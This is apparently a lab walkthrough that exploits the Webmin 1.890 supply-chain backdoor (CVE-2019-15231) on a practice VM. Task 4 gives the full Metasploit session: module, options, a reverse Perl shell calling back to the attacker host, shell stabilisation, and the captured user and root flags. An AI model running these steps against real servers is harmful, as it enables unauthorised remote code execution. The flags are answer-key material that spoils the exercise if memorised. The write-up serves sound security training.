ATTACKERKB.




[>>> TASK 1: I'M ATTACKING WHAT NOW?]
[1.1. READ THE ABOVE AND MOVE ONTO TASK TWO!]
Nothing to answer here.




[>>> TASK 2: DISCOVERING THE LAY OF THE LAND]
[2.1. DEPLOY THE VIRTUAL MACHINE ATTACHED TO THIS TASK. THIS DEPLOYMENT PERIOD WILL TAKE ABOUT TWO MINUTES AT MOST]
Nothing to answer here.



[2.2. SCAN THE MACHINE WITH NMAP. WHAT NON-STANDARD SERVICE CAN BE FOUND RUNNING ON THE HIGH-PORT?]
[ACTION: nmap quick all ports scan]
nmap -sS -T4 -sV -p- 10.10.15.74
[OUTPUT]
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[ANSWER]
webmin



[2.3. FURTHER ENUMERATE THIS SERVICE, WHAT VERSION OF IT IS RUNNING?]
[ANSWER (based on last output)]
1.890



[2.4. VISIT THE WEBPAGE GENERATED BY THIS SERVICE. YOU SHOULD ENCOUNTER AN ERROR DUE TO SSL BEING PRESENT. CHANGE THE URL TO USE HTTPS AND IGNORE THE EXCEPTION. AFTER THIS, VIEW THE CERTIFICATE. WHAT HOSTNAME CAN WE FIND ON THE CERT DETAILS? ON FIREFOW, YOU CAN VIEW THIS BY CLICKING ON THE 'i' IN THE URL, THEN THE '>' IN CONNECTION, 'MORE INFORMATION' AND THEN 'VIEW CERTIFICATE' ON THE SECURITY TAB]
[ACTION: visit http://10.10.15.74:10000/]
[OUTPUT]
Error - Document follows
This web server is running in SSL mode. Try the URL https://ip-10-10-15-74.eu-west-1.compute.internal:10000/ instead.


[NOTE]
Click Advanced > Proceed to 10.10.15.74 (unsafe)
[ACTION: visit https://10.10.15.74:10000/]
[OUTPUT]
 Webmin
You must enter a username and password to login to the server on 10.10.15.74

Username
Password
 Remember me
[NOTE]
We find a webmin login portal.


[ACTION: find hostname]
Click Not Secure > Certificate details > Details > Issuer
[OUTPUT]
emailAddress = root@source
CN = *
O = Webmin Webserver on source
[ANSWER]
source



[2.5. ADJUST YOUR /etc/hosts FILE ACCORDINGLY TO INCLUDE THE NEWLY DISCOVERED HOSTNAME AND REVISIT THE WEBPAGE IN QUESTION. NOTE, THAT THIS WILL CONFIRM THAT THE SREVICE WAS PREVIOUSLY DISCOVERED USING NMAP IS CORRECT. ONCE YOU'VE DONE THIS, MOVE ONTO TASK THREE]
[ACTION: add found hostname to hosts]
sudo nano /etc/hosts
Add line: 10.10.15.74 source


[ACTION: explore https://source:10000/]
Same webmin login portal.




[>>> TASK 3: LEARNING TO FLY]
[3.1. THE AKB DASHBOARD AT THE TIME OF WRITING. NOTE, WE WON'T HAVE TO LOG IN FOR WHAT WE'RE DOING. THAT BEING SAID, LOGGING IN (VIA GitHub OAuth) ALLOWS US TO POST AND CONTRIBUTE TO DISCUSSIONS SURROUNDING VULNERABILITIES]
Nothing to answer here.



[3.2. AKB ALLOWS US TO SEARCH FOR VARIOUS VULNERABILITIES VIA THE SEARCH BAR AT THE TOP RIGHT OF THE SITE. SEARCH NOW FOR 'WEBMIN' AND CLICK ON 'password_change.cgi']
[ACTION: search for requeted vulnerability]
[OUTPUT]
Get redirected to https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search



[3.3. TAKE A LOOK THROUGH THE ASSESSMENTS FOR THIS VULNERABILITY. AS AN ATTACKER, WE CAN USE THE INFORMATION POSTED HERE BY OTHER MEMBERS TO DETERMINE HOW VALUE AN EXPLOIT MIGHT BE AND ANY TWEAKS WE MIGHT HAVE TO MAKE TO EXPLOIT CODE. SIMILARLY, AS A DEFENDER WE CAN LEVERAGE THESE COMMENTS TO GAIN ADDITIONAL SITUATIONAL INFORMATION FOR VULNERABILITIES, ALLOWING US TO GAUGE HOW QUICKLY WE NEED TO PATCH THEM. WHICH VERSION OF WEBMIN IS IMMEDIATELY VULNERABLE TO THIS EXPLOIT?]
[ACTION: search for version inhttps://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search]
[OUTPUT]
Technical Analysis
This was a supply chain attack: http://www.webmin.com/exploit.html. The backdoor was introduced in a version that was “exploitable” in the default install. Version 1.890 is the money. Anything after requires a non-default setting.

Note that SourceForge installs are affected, but GitHub checkouts aren’t.

ETA: Metasploit added an exploit module.
[ANSWER]
1.890



[3.4. WHAT TYPE OF ATTACK WAS THIS? NOTE, WE'RE LOOKING FOR HOW THIS WAS ADDED TO THE CODE FOR WEBMIN, NOT HOW THIS RESULTS IN REMOTE CODE EXECUTION (RCE)]
[ANSWER (based on last output)]
supply chain



[3.5. CAN YOU FIND A LINK TO A POST ON THE WEBMIN'S WEBSITE EXPLAINING WHAT HAPPENED? WHAT DAY WAS WEBMIN INFORMED OF AN 0DAY EXPLOIT?]
[ACTION: explore https://webmin.com/security/#remote-command-execution-cve-2019-15231]
[OUTPUT]
On August 17th 2019, we were informed that a 0-day exploit that made use of the vulnerability had been released. In response, the exploit code was removed and Webmin version 1.930 created and released to all users.
[ANSWER]
August 17th 2019



[3.6. LAST BUT CERTAINLY NOT LEAST, LET'S FIND THE LINK TO OUR EXPLOIT. WE CAN SEE IN THE ASSESSMENTS THAT A METASPLOIT MODULE WAS ADDED FOR THIS BACKDOOR. WHAT PULL NUMBER WAS THIS ADDED IN?]
[ACTION: search for pull]
[OUTPUT]
https://github.com/rapid7/metasploit-framework/pull/12219
[ANSWER]
12219


 
[3.7. ONCE YOU'VE LOCATED THE EXPLOIT, LET'S MOVE ONTO TASK FOUR!]
Nothing to answer here.




[>>> TASK 4: BLASTING AWAY]
[4.1. LAUNCH METASPLOIT NOW AS WE'LL BE LEVERAGING THE METASPLOIT MODULE FOR THIS EXPLOIT]
[ACTION: run metasploit]
msfconsole



[4.2. WITH METASPLOIT OPEN, SEARC FOR AND SELECT THE EXPLOIT WE PREVIOUSLY INVESTIGATED]
[ACTION: set our exploit]
use exploit/unix/webapp/webmin_backdoor
[NOTE]
It has been moved to: exploit/linux/http/webmin_backdoor



[4.3. NOW THAT WE'VE SELECTED OUR EXPLOIT, SET THE OPTIONS PROVIDED APPROPIATELY. BEYOND RHOSTS AND LHOST, WHAT IS THE THIRD OPTION WE MUST SET TO 'True'?]
[ACTION: show options]
show options
[OUTPUT]
Module options (exploit/unix/webapp/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:
                                         host:port[,type:host:port][..
                                         .]. Supported proxies: sapni,
                                          socks4, socks5, socks5h, htt
                                         p
   RHOSTS                      yes       The target host(s), see https
                                         ://docs.metasploit.com/docs/u
                                         sing-metasploit/basics/using-
                                         metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoin
                                         g connections
   SSLCert                     no        Path to a custom SSL certific
                                         ate (default is randomly gene
                                         rated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this explo
                                         it (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network inter
                                       face to listen on. This must be
                                        an address on the local machin
                                       e or 0.0.0.0 to listen on all a
                                       ddresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface
                                     may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


[ACTION: set basic options]
set LHOST 10.23.25.109
set RHOSTS 10.10.15.74


[NOTE]
We also need to set ssl to true (before we had to deal with http vs https and the certification due to ssl being enabled).
[ACTION: set third option]
set SSL true
[ANSWER]
ssl



[4.4. RUN THE EXPLOIT. WHAT IS THE USER FLAG?]
[ACTION: run exploit]
run 
[OUTPUT]
[*] Started reverse TCP handler on 10.23.25.109:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.23.25.109:4444 -> 10.10.15.74:37868) at 2025-08-03 12:33:02 +0200



[ACTION: stabilize shell]
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm


[ACTION: find user flag]
find / -name "user.txt" 2>/dev/null
[OUTPUT]
/home/dark/user.txt


[ACTION: display user flag]
cat /home/dark/user.txt
[OUTPUT]
THM{SUPPLY_CHAIN_COMPROMISE}
[ANSWER]
THM{SUPPLY_CHAIN_COMPROMISE}



[4.5. HOW ABOUT THE ROOT FLAG?]
[ACTION: display root flag]
cat /root/root.txt
[OUTPUT]
THM{UPDATE_YOUR_INSTALL}



[4.6. ONCE YOU'VE COMPLETED GAINING THE ROOT FLAG, MOVE ONTO THE FIFTH AND FINAL TASK]
Nothing to answer here.




[>>> TASK 5: GOING FURTHER]
[5.1. READ THE ABOVE AND KEEP LEARNING!]
Nothing to answer here.
